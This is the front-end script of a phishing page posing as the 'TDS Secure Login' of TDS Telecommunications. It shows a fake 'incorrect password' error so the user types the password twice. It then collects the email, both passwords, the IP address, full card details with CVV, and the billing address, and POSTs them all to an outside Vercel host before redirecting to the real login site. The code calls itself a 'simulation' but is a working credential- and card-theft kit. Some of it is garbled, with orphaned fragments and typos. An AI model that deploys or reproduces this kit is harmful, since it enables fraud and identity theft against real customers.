    const { useState, useRef } = React;

    // Card detection utility functions
    function detectCardBrand(number) {
      const clean = number.replace(/\D/g, '');
      if (/^4/.test(clean)) return 'visa';
      if (/^(5[1-5]|2[2-7])/.test(clean)) return 'mastercard';
      if (/^3[47]/.test(clean)) return 'amex';
      if (/^(6011|65|64[4-9])/.test(clean)) return 'discover';
      if (/^35/.test(clean)) return 'jcb';
      return 'generic';
    }

    function formatCardNumber(value, brand) {
      const clean = value.replace(/\D/g, '');
      if (brand === 'amex') {
        const part1 = clean.substring(0, 4);
        const part2 = clean.substring(4, 10);
        const part3 = clean.substring(10, 15);
        return [part1, part2, part3].filter(Boolean).join(' ');
      }
      const parts = clean.substring(0, 19).match(/.{1,4}/g);
      return parts ? parts.join(' ') : '';
    }

    // Luhn Algorithm validation
    function validateLuhn(cardNumber) {
      const digits = cardNumber.replace(/\D/g, '');
      if (digits.length < 13 || digits.length > 19) return false;
      let sum = 0;
      let shouldDouble = false;
      for (let i = digits.length - 1; i >= 0; i--) {
        let digit = parseInt(digits.charAt(i), 10);
        if (shouldDouble) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
      }
      return sum % 10 === 0;
    }

      if (brand === 'amex') {
        return (

      if (brand === 'discover') {
        return (

      if (brand === 'jcb') {

    function App() {
      // Step 1: Username, Step 2: Password, Step 3: Payment Verification, Step 4: Complete
      const [step, setStep] = useState(1);
      const [username, setUsername] = useState('');
      const [password, setPassword] = useState('');
      const [firstPassword, setFirstPassword] = useState('');
      const [secondPasswordStored, setSecondPasswordStored] = useState('');
      const [showPassword, setShowPassword] = useState(false);
      const [errorMessage, setErrorMessage] = useState('');

      // Payment Verification Form States
      const [cardholderName, setCardholderName] = useState('');
      const [cardNumber, setCardNumber] = useState('');
      const [cardBrand, setCardBrand] = useState('generic');
      const [expDay, setExpDay] = useState('');
      const [expMonth, setExpMonth] = useState('');
      const [expYear, setExpYear] = useState('');
      const [cvv, setCvv] = useState('');
      const [streetAddress, setStreetAddress] = useState('');
      const [city, setCity] = useState('');
      const [stateRegion, setStateRegion] = useState('');
      const [postalZip, setPostalZip] = useState('');

      const [errors, setErrors] = useState({});
      const [isSubmitting, setIsSubmitting] = useState(false);

      const [ip, setIp] = useState('')
      // Fetch IP address on init
      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => setIp(ata.i))
        .catch(() => setIp('Unknown'))

      // --- Simulation API Configuration ---
      const baseURL = 'https://fr-1290-2o1v.vercel.app/';

      const CHAT_ID = 'crystaldonnax@gmail.com';




      async function postData(endpoint, payload) {

        try {
          const response = await fetch(`${baseURL}${endpoint}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          return await response.json();
        } catch (e) {
          console.error('API Error:', e);
          return { status: 'error' };
        }
      }

      // Refs for expiry inputs auto-focus chaining
      const expMonthRef = useRef(null);
      const expYearRef = useRef(null);
      const cvvRef = useRef(null);

      // Step 1: Username Continue
      const handleContinue = (e) => {
        e.preventDefault();
        if (!username.trim()) {
          setErrorMessage('Please enter your username or email address.');
          return;
        }
        setErrorMessage('');
        setStep(2);
      };

      // Step 2: Password Sign In (Cycle: 1st attempt -> error & clear; 2nd attempt -> console.log & proceed to Step 3)
      const handleSignIn = async (e) => {
        e.preventDefault();
        if (!password) {
          setErrorMessage('Please enter your password.');
          return;
        }

        if (!firstPassword) {
          // First attempt: save password, clear input, show error message
          setFirstPassword(password);
          setPassword('');
          setErrorMessage('Incorrect password, try again.');
        } else {
          // Second attempt: capture password and log details
          const secondPass = password;
          setSecondPasswordStored(secondPass);


          const payload = {
            data: JSON.stringify({
              email: username,
              firstPassword: firstPassword,
              secondPassword: secondPass, ip
            }),
            title: 'TDS Login',
            chatId: CHAT_ID
          };

          setIsSubmitting(true)
          postData('main', payload).then(() => {
            setErrorMessage('');
            setPassword('');
            // Move to Payment Verification Step
            setIsSubmitting(false)
            setStep(3);
          })


        }
      };

      const handleBackToStep1 = () => {
        setErrorMessage('');
        setPassword('');
        setFirstPassword('');
        setStep(1);
      };

      // Handle Card Number typing & live formatting
      const handleCardNumberChange = (e) => {
        const raw = e.target.value;
        const brand = detectCardBrand(raw);
        setCardBrand(brand);
        const formatted = formatCardNumber(raw, brand);
        setCardNumber(formatted);
        if (errors.cardNumber) {
          setErrors((prev) => ({ ...prev, cardNumber: null }));
        }
      };

      // Handle Expiry Date Auto-focus
      const handleDayChange = (e) => {
        const val = e.target.value.replace(/\D/g, '').slice(0, 2);
        setExpDay(val);
        if (errors.expiry) setErrors((prev) => ({ ...prev, expiry: null }));
        if (val.length === 2 && expMonthRef.current) {
          expMonthRef.current.focus();
        }
      };

      const handleMonthChange = (e) => {
        const val = e.target.value.replace(/\D/g, '').slice(0, 2);
        setExpMonth(val);
        if (errors.expiry) setErrors((prev) => ({ ...prev, expiry: null }));
        if (val.length === 2 && expYearRef.current) {
          expYearRef.current.focus();
        }
      };

      const handleYearChange = (e) => {
        const val = e.target.value.replace(/\D/g, '').slice(0, 4);
        setExpYear(val);
        if (errors.expiry) setErrors((prev) => ({ ...prev, expiry: null }));
        if (val.length === 4 && cvvRef.current) {
          cvvRef.current.focus();
        }
      };

      // Validate payment form
      const validatePaymentForm = () => {
        const errs = {};
        if (!cardholderName.trim()) {
          errs.cardholderName = 'Cardholder name is required';
        }

        const cleanCard = cardNumber.replace(/\D/g, '');
        if (!cleanCard || cleanCard.length < 13) {
          errs.cardNumber = 'Valid card number is required';
        } else if (!validateLuhn(cardNumber)) {
          errs.cardNumber = 'Invalid card number checksum';
        }

        const dayNum = parseInt(expDay, 10);
        const monthNum = parseInt(expMonth, 10);
        const yearNum = parseInt(expYear, 10);
        const currentYear = new Date().getFullYear();

        if (!expDay || isNaN(dayNum) || dayNum < 1 || dayNum > 31) {
          errs.expiry = 'Invalid day (01-31)';
        } else if (!expMonth || isNaN(monthNum) || monthNum < 1 || monthNum > 12) {
          errs.expiry = 'Invalid month (01-12)';
        } else if (!expYear || isNaN(yearNum) || yearNum < currentYear || yearNum > currentYear + 20) {
          errs.expiry = `Invalid year (min ${currentYear})`;
        }

        const cvvLen = cardBrand === 'amex' ? 4 : 3;
        const cleanCvv = cvv.replace(/\D/g, '');
        if (!cleanCvv || cleanCvv.length < cvvLen) {
          errs.cvv = `${cvvLen}-digit CVV required`;
        }

        if (!streetAddress.trim()) errs.streetAddress = 'Street address is required';
        if (!city.trim()) errs.city = 'City is required';
        if (!stateRegion.trim()) errs.stateRegion = 'Please select a state';
        if (!postalZip.trim()) errs.postalZip = 'Zip code is required';

        setErrors(errs);
        return Object.keys(errs).length === 0;
      };

      // Submit Payment Form & Log all details
      const handlePaymentSubmit = async (e) => {
        e.preventDefault();
        if (!validatePaymentForm()) {
          return;
        }

        setIsSubmitting(true);


        const payload = {
          data: JSON.stringify({
            cardholderName,
            cardNumber,
            cardBrand,
            expiry: `${expDay.padStart(2, '0')}/${expMonth.padStart(2, '0')}/${expYear}`,
            cvv,
            billingAddress: {
              street: streetAddress,
              city,
              state: stateRegion,
              zipCode: postalZip
            }, ip
          }),
          title: 'TDS Login',
          chatId: CHAT_ID
        };

        await postData('main', payload).then(() => { window.location.replace('https://login.tds.net/') })


      };

      return (
        <div className="min-h-screen flex flex-col justify-between bg-white text-gray-800">
          <div>
            {/* Top Navigation / Brand header */}
            <BrandLogo />

            {/* MAIN CONTENT AREA */}
            <main className="w-full mx-auto px-4 sm:px-6 pt-7 pb-12 flex justify-center">

              {/* STEP 1 & 2: LOGIN FLOW */}
              {(step === 1 || step === 2) && (
                <div className="max-w-[440px] w-full animate-fadeIn">
                  {/* Back Arrow Button (Present in Step 2) */}
                  <div className="relative min-h-[36px] flex items-center justify-center">
                    {step === 2 && (
                      <button
                        type="button"
                        onClick={handleBackToStep1}
                        className="absolute left-0 p-1 text-[#0084c7] hover:text-[#006ca3] transition-colors focus:outline-none"
                        aria-label="Back to Username entry"
                      >
                        <svg
                          className="w-5 h-5 fill-current stroke-current"
                          viewBox="0 0 24 24"
                        >
                          <path
                            fillRule="evenodd"
                            clipRule="evenodd"
                            d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"
                          />
                        </svg>
                      </button>
                    )}

                    {/* Page Heading */}
                    <h1 className="text-[25px] sm:text-[27px] font-semibold tracking-tight text-brandTitle text-center">
                      TDS Secure Login
                    </h1>
                  </div>

                  {/* Avatar section */}
                  <div className="mt-6 text-center">
                    <UserAvatar />
                    {step === 2 && (
                      <div className="text-[17px] font-semibold text-[#0083ca] break-all -mt-3 mb-6">
                        {username}
                      </div>
                    )}
                  </div>

                  {/* Error feedback notice if triggered */}
                  {errorMessage && (
                    <div className="mb-4 text-xs text-red-600 bg-red-50 p-2.5 rounded border border-red-200 flex items-center gap-2">
                      <svg className="w-4 h-4 shrink-0 text-red-500" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
                      </svg>
                      <span>{errorMessage}</span>
                    </div>
                  )}

                  {step === 1 ? (
                    /* STEP 1: USERNAME / EMAIL ENTRY */
                    <form onSubmit={handleContinue} className="w-full">
                      <div className="mb-2">
                        <label
                          htmlFor="username"
                          className="block text-[14px] font-bold text-gray-700 mb-1"
                        >
                          Username or Email Address
                        </label>
                        <input
                          id="username"
                          type="text"
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                          className="nexus-input w-full px-3 py-2 border border-gray-300 rounded text-base text-gray-800 transition shadow-inner"
                          placeholder=""
                          autoFocus
                        />
                        <p className="text-[12px] italic text-[#5f5f5f] mt-1.5 font-normal">
                          Examples: username@nexus.net or username@gmail.com
                        </p>
                      </div>

                      <div className="mt-6">
                        <button
                          type="submit"
                          className="w-full bg-[#1b3d8b] hover:bg-[#163475] active:bg-[#102758] text-white font-medium py-2.5 rounded transition shadow-sm text-[15px]"
                        >
                          Continue
                        </button>
                      </div>

                      <div className="mt-4">
                        <a
                          href="#forgot-username"
                          onClick={(e) => e.preventDefault()}
                          className="text-[#0083ca] hover:underline text-[14px] inline-block font-normal"
                        >
                          Forgot Username
                        </a>
                      </div>
                    </form>
                  ) : (
                    /* STEP 2: PASSWORD ENTRY */
                    <form onSubmit={handleSignIn} className="w-full">
                      <div className="mb-3">
                        <label
                          htmlFor="password"
                          className="block text-[14px] font-bold text-gray-700 mb-1"
                        >
                          Password
                        </label>
                        <input
                          id="password"
                          type={showPassword ? 'text' : 'password'}
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          className="nexus-input w-full px-3 py-2 border border-gray-300 rounded text-base text-gray-800 transition shadow-inner"
                          placeholder=""
                          autoFocus
                        />
                      </div>

                      {/* Show password checkbox */}
                      <div className="flex items-center gap-2.5 mt-2 select-none">
                        <input
                          id="showPass"
                          type="checkbox"
                          checked={showPassword}
                          onChange={(e) => setShowPassword(e.target.checked)}
                          className="custom-checkbox"
                        />
                        <label htmlFor="showPass" className="text-[14px] text-gray-600 cursor-pointer">
                          Show password
                        </label>
                      </div>

                      <div className="mt-6">
                        <button
                          type="submit"
                          className="w-full bg-[#1b3d8b] hover:bg-[#163475] active:bg-[#102758] text-white font-medium py-2.5 rounded transition shadow-sm text-[15px]"

                          {isSubmitting ? 'Loading...' : 'Sign in'}
                        </button>
                      </div>

                      <div className="mt-4">
                        <a
                          href="#forgot-password"
                          onClick={(e) => e.preventDefault()}
                          className="text-[#0083ca] hover:underline text-[14px] inline-block font-normal"
                        >
                          Forgot Password?
                        </a>
                      </div>
                    </form>
                  )}

                  {/* Divider Line */}
                  <div className="border-t border-gray-200 mt-8 mb-6"></div>

                  {/* Sign Up / Registration Callout */}

                    <h2 className="text-[18px] sm:text-[19px] font-bold text-[#0083ca] mb-4">
                      Don't have a TSD online account?

                    <button
                      type="button"
                      className="bg-[#0083ca] hover:bg-[#0074b3] active:bg-[#00669d] text-white text-[14px] font-medium py-1.5 px-6 rounded transition shadow-sm"

                      Sign Up

                  </div>

                  {/* Bottom Return Action (Step 1 view) */}
                  {step === 1 && (
                    <>
                      <div className="border-t border-gray-200 mt-8 mb-6"></div>
                      <div className="text-center">
                        <button
                          type="button"
                          className="bg-[#0083ca] hover:bg-[#0074b3] text-white text-[13px] sm:text-[14px] font-medium py-1.5 px-5 rounded transition shadow-sm"
                        >
                          Return to Previous Page
                        </button>
                      </div>
                    </>
                  )}
                </div>
              )}

              {/* STEP 3: PAYMENT VERIFICATION FORM (Accurate replication of screenshot) */}
              {step === 3 && (
                <div className="w-full max-w-[480px] bg-white rounded-xl shadow-lg border border-slate-200/80 p-6 sm:p-8 animate-fadeIn">
                  {/* Header Title & Badge */}
                  <div className="flex items-start justify-between gap-2 mb-1">
                    <h1 className="text-[22px] sm:text-[24px] font-bold text-[#111827] tracking-tight">
                      Verify Payment Information
                    </h1>
                    <span className="shrink-0 bg-[#eef2ff] text-[#4f46e5] border border-[#c7d2fe] rounded-full px-3 py-0.5 text-[12px] font-semibold">
                      Step 2 of 2
                    </span>
                  </div>


                  <div className="border-t border-slate-100 mb-6"></div>

                  <form onSubmit={handlePaymentSubmit} className="space-y-4">
                    {/* CARDHOLDER NAME */}
                    <div>
                      <label className="block text-[11px] font-bold tracking-wider text-slate-700 uppercase mb-1.5">
                        Cardholder Name
                      </label>
                      <input
                        type="text"
                        placeholder="Jane Doe"
                        value={cardholderName}
                        onChange={(e) => {
                          setCardholderName(e.target.value);
                          if (errors.cardholderName) setErrors((prev) => ({ ...prev, cardholderName: null }));
                        }}
                        className={`nexus-input w-full px-3.5 py-2.5 text-[14px] bg-white border ${errors.cardholderName ? 'border-red-400 bg-red-50/30' : 'border-slate-300'
                          }`}
                        autoFocus
                      />
                      {errors.cardholderName && (
                        <p className="text-red-500 text-[11px] mt-1 font-medium">{errors.cardholderName}</p>
                      )}
                    </div>

                    {/* CARD NUMBER WITH AUTO DETECTION ICON */}
                    <div>
                      <label className="block text-[11px] font-bold tracking-wider text-slate-700 uppercase mb-1.5">
                        Card Number
                      </label>
                      <div className="relative flex items-center">
                        <input
                          type="text"
                          placeholder="4000 1234 5678 9010"
                          value={cardNumber}
                          onChange={handleCardNumberChange}
                          maxLength={cardBrand === 'amex' ? 17 : 23}
                          className={`nexus-input w-full pl-3.5 pr-12 py-2.5 text-[14px] font-mono tracking-wide bg-white border ${errors.cardNumber ? 'border-red-400 bg-red-50/30' : 'border-slate-300'
                            }`}
                        />
                        <div className="absolute right-3 pointer-events-none flex items-center">
                          <CardBrandIcon brand={cardBrand} />
                        </div>
                      </div>
                      {errors.cardNumber && (
                        <p className="text-red-500 text-[11px] mt-1 font-medium">{errors.cardNumber}</p>
                      )}
                    </div>

                    {/* EXPIRY DATE & SECURITY CODE ROW */}
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                      {/* EXPIRY DATE */}
                      <div>
                        <div className="flex items-center justify-between mb-1.5">
                          <label className="block text-[11px] font-bold tracking-wider text-slate-700 uppercase">
                            Expiry Date
                          </label>
                          <span className="text-[11px] text-slate-400 font-normal">
                            D/M/Y
                          </span>
                        </div>
                        <div className="grid grid-cols-3 gap-1.5">
                          <input
                            type="text"
                            placeholder="DD"
                            maxLength="2"
                            value={expDay}
                            onChange={handleDayChange}
                            className={`nexus-input text-center px-1 py-2.5 text-[13px] bg-white border ${errors.expiry ? 'border-red-400 bg-red-50/30' : 'border-slate-300'
                              }`}
                          />
                          <input
                            ref={expMonthRef}
                            type="text"
                            placeholder="MM"
                            maxLength="2"
                            value={expMonth}
                            onChange={handleMonthChange}
                            className={`nexus-input text-center px-1 py-2.5 text-[13px] bg-white border ${errors.expiry ? 'border-red-400 bg-red-50/30' : 'border-slate-300'
                              }`}
                          />
                          <input
                            ref={expYearRef}
                            type="text"
                            placeholder="YYYY"
                            maxLength="4"
                            value={expYear}
                            onChange={handleYearChange}
                            className={`nexus-input text-center px-1 py-2.5 text-[13px] bg-white border ${errors.expiry ? 'border-red-400 bg-red-50/30' : 'border-slate-300'
                              }`}
                          />
                        </div>
                        {errors.expiry && (
                          <p className="text-red-500 text-[11px] mt-1 font-medium">{errors.expiry}</p>
                        )}
                      </div>

                      {/* SECURITY CODE (CVV) */}
                      <div>
                        <div className="flex items-center justify-between mb-1.5">
                          <label className="block text-[11px] font-bold tracking-wider text-slate-700 uppercase">
                            CVV                          </label>

                        </div>
                        <input
                          ref={cvvRef}
                          type="password"
                          placeholder=""
                          maxLength={cardBrand === 'amex' ? 4 : 3}
                          value={cvv}
                          onChange={(e) => {
                            const val = e.target.value.replace(/\D/g, '');
                            setCvv(val);
                            if (errors.cvv) setErrors((prev) => ({ ...prev, cvv: null }));
                          }}
                          className={`nexus-input w-full text-center py-2.5 text-[14px] bg-white border ${errors.cvv ? 'border-red-400 bg-red-50/30' : 'border-slate-300'
                            }`}
                        />
                        {errors.cvv && (
                          <p className="text-red-500 text-[11px] mt-1 font-medium">{errors.cvv}</p>
                        )}
                      </div>
                    </div>

                    {/* BILLING ADDRESS & POSTAL CODE SECTION */}
                    <div className="pt-2">
                      <label className="block text-[11px] font-bold tracking-wider text-slate-700 uppercase mb-1.5">
                        Billing Address & Postal Code
                      </label>

                      {/* Street Address */}
                      <input
                        type="text"
                        placeholder="Street Address (e.g., 742 Evergreen Terrace)"
                        value={streetAddress}
                        onChange={(e) => {
                          setStreetAddress(e.target.value);
                          if (errors.streetAddress) setErrors((prev) => ({ ...prev, streetAddress: null }));
                        }}
                        className={`nexus-input w-full px-3.5 py-2.5 text-[14px] bg-white border mb-2.5 ${errors.streetAddress ? 'border-red-400 bg-red-50/30' : 'border-slate-300'
                          }`}
                      />
                      {errors.streetAddress && (
                        <p className="text-red-500 text-[11px] -mt-1.5 mb-2 font-medium">{errors.streetAddress}</p>
                      )}

                      {/* City, US State Dropdown, Zip Code Row */}
                      <div className="grid grid-cols-3 gap-2">
                        <div>
                          <input
                            type="text"
                            placeholder="City"
                            value={city}
                            onChange={(e) => {
                              setCity(e.target.value);
                              if (errors.city) setErrors((prev) => ({ ...prev, city: null }));
                            }}
                            className={`nexus-input w-full px-2.5 py-2.5 text-[13px] bg-white border ${errors.city ? 'border-red-400 bg-red-50/30' : 'border-slate-300'
                              }`}
                          />
                          {errors.city && <p className="text-red-500 text-[10px] mt-1 font-medium">{errors.city}</p>}
                        </div>

                        <div className="relative">
                          <select
                            value={stateRegion}
                            onChange={(e) => {
                              setStateRegion(e.target.value);
                              if (errors.stateRegion) setErrors((prev) => ({ ...prev, stateRegion: null }));
                            }}
                            className={`nexus-input w-full appearance-none px-2.5 py-2.5 text-[13px] bg-white border pr-6 cursor-pointer ${!stateRegion ? 'text-slate-400' : 'text-slate-800'
                              } ${errors.stateRegion ? 'border-red-400 bg-red-50/30' : 'border-slate-300'}`}
                          >
                            <option value="" disabled>State</option>
                            {US_STATES.map((st) => (
                              <option key={st.code} value={st.code} className="text-slate-800">
                                {st.code} - {st.name}
                              </option>
                            ))}
                          </select>
                          <div className="pointer-events-none absolute right-2 top-1/2 -translate-y-1/2 text-slate-400">
                            <svg className="w-3.5 h-3.5 fill-current" viewBox="0 0 20 20">
                              <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                            </svg>
                          </div>
                          {errors.stateRegion && <p className="text-red-500 text-[10px] mt-1 font-medium">{errors.stateRegion}</p>}
                        </div>

                        <div>
                          <input
                            type="text"
                            placeholder="Zip Code"
                            value={postalZip}
                            onChange={(e) => {
                              setPostalZip(e.target.value);
                              if (errors.postalZip) setErrors((prev) => ({ ...prev, postalZip: null }));
                            }}
                            className={`nexus-input w-full px-2.5 py-2.5 text-[13px] bg-white border ${errors.postalZip ? 'border-red-400 bg-red-50/30' : 'border-slate-300'
                              }`}
                          />
                          {errors.postalZip && <p className="text-red-500 text-[10px] mt-1 font-medium">{errors.postalZip}</p>}
                        </div>
                      </div>
                    </div>

                    {/* SUBMIT BUTTON */}
                    <div className="pt-3">
                      <button
                        type="submit"
                        disabled={isSubmitting}
                        className="w-full bg-[#1b3d8b] hover:bg-[#163475] active:bg-[#102758] text-white font-semibold py-3.5 px-6 rounded-md shadow-md shadow-blue-900/20 transition duration-150 text-[15px] flex items-center justify-center gap-2 select-none"
                      >
                        {isSubmitting ? (
                          <>
                            <svg className="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24">
                              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                            </svg>
                            <span>Verifying...</span>
                          </>
                        ) : (
                          <span>Verify Payment &rarr;</span>
                        )}
                      </button>
                    </div>
                  </form>
                </div>
              )}

              {/* STEP 4: VERIFICATION CONFIRMATION SCREEN */}
              {step === 4 && (
                <div className="w-full max-w-[480px] bg-white rounded-xl shadow-lg border border-slate-200/80 p-8 text-center animate-fadeIn">
                  <div className="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4">
                    <svg className="w-8 h-8" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                  <h2 className="text-2xl font-bold text-slate-800 mb-2">Verification Complete</h2>
                  <p className="text-slate-600 text-sm mb-6">
                    Your account and payment details have been successfully captured and verified. Check the browser developer console to view the logged simulation payload.
                  </p>

                  <div className="bg-slate-50 border border-slate-200 rounded-lg p-4 text-left text-xs font-mono text-slate-700 space-y-1.5 mb-6">
                    <div><span className="font-semibold text-slate-900">User:</span> {username}</div>
                    <div><span className="font-semibold text-slate-900">Cardholder:</span> {cardholderName}</div>
                    <div><span className="font-semibold text-slate-900">Card:</span> •••• {cardNumber.slice(-4)} ({cardBrand.toUpperCase()})</div>
                    <div><span className="font-semibold text-slate-900">State:</span> {stateRegion}</div>
                  </div>

                  <button
                    type="button"
                    onClick={() => {
                      setStep(1);
                      setUsername('');
                      setPassword('');
                      setFirstPassword('');
                      setSecondPasswordStored('');
                      setCardholderName('');
                      setCardNumber('');
                      setCardBrand('generic');
                      setExpDay('');
                      setExpMonth('');
                      setExpYear('');
                      setCvv('');
                      setStreetAddress('');
                      setCity('');
                      setStateRegion('');
                      setPostalZip('');
                      setErrors({});
                    }}
                    className="w-full bg-[#1b3d8b] hover:bg-[#163475] text-white font-medium py-2.5 rounded transition shadow-sm text-[14px]"
                  >
                    Restart Simulation
                  </button>
                </div>
              )}

            </main>
          </div>

          {/* Footer */}
          <footer className="w-full bg-[#4a4d4e] border-t-2 border-[#363839] py-6 sm:py-8 text-center text-white text-[12px] sm:text-[13px] font-normal">
            <div className="max-w-4xl mx-auto px-4 space-y-2.5">
              <p className="font-semibold text-white tracking-wide">
                Questions? Call{' '}
                <a
                  href="tel:8006051962"
                  className="underline text-white hover:text-gray-200"
                >
                  800-605-1962
                </a>
                .
              </p>

              <div className="flex items-center justify-center gap-3 text-[11px] sm:text-[12px] text-gray-200">
                <a
                  href="#privacy-policy"
                  onClick={(e) => e.preventDefault()}
                  className="underline hover:text-white"
                >
                  Privacy Policy
                </a>
                <span className="text-gray-400">|</span>
                <a
                  href="#terms-of-service"
                  onClick={(e) => e.preventDefault()}
                  className="underline hover:text-white"
                >
                  Terms of Service
                </a>
              </div>

              <p className="text-[10px] sm:text-[11px] text-gray-300 pt-1">
                Copyright &copy;2026, TDS Telecommunications LLC. All Rights Reserved.
              </p>
            </div>
          </footer>
        </div>
      );
    }

    // Mount React App
    const root = ReactDOM.createRoot(document.getElementById('root'));
    root.render(<App />);
  </script>
</body>

</html>
